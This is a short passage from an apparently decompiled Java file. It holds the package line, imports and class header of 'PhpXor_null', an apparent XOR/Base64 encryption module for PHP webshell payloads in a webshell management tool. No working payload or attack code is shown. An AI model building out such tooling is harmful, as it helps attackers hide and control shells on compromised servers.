 ...
 */
package shells.cryptions.phpXor_null;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import shells.cryptions.phpXor_null.Generate;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name="PHP_XOR_null_BASE64", payloadName="PhpDynamicPayload")
public class PhpXor_null
implements Cryption {
